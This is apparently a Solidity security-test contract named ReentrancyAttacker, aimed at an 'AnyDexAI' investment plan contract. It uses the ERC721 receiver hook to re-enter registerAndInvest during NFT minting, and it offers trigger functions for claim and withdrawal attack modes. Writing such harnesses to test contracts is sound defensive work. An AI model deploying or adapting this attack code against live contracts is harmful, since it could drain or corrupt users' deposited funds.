// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IAnyDexAIMainPlanAttack {
    function claimRoi(uint256 invIndex) external;
    function withdrawLevelIncome() external;
    function registerAndInvest(address sponsor, uint256 packageId) external;
}

contract ReentrancyAttacker {
    IAnyDexAIMainPlanAttack public target;
    address public owner;
    bool public attacking;
    uint256 public attackCount;

    enum AttackMode { None, ClaimRoi, WithdrawLevel, Register }
    AttackMode public mode;

    constructor() {
        owner = msg.sender;
    }

    function setTarget(address _target) external {
        target = IAnyDexAIMainPlanAttack(_target);
    }

    function setMode(AttackMode _mode) external {
        mode = _mode;
    }

    // ERC721 receiver hook - attempts reentrancy during mintEntryPass / mintRoyalNFT!
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!attacking && mode == AttackMode.Register) {
            attacking = true;
            attackCount++;
            target.registerAndInvest(owner, 1);
        }
        return this.onERC721Received.selector;
    }

    // Trigger initial call
    function attackRegister(address sponsor, uint256 packageId) external {
        mode = AttackMode.Register;
        target.registerAndInvest(sponsor, packageId);
    }

    function attackClaimRoi(uint256 invIndex) external {
        mode = AttackMode.ClaimRoi;
        target.claimRoi(invIndex);
    }

    function attackWithdrawLevel() external {
        mode = AttackMode.WithdrawLevel;
        target.withdrawLevelIncome();
    }
}
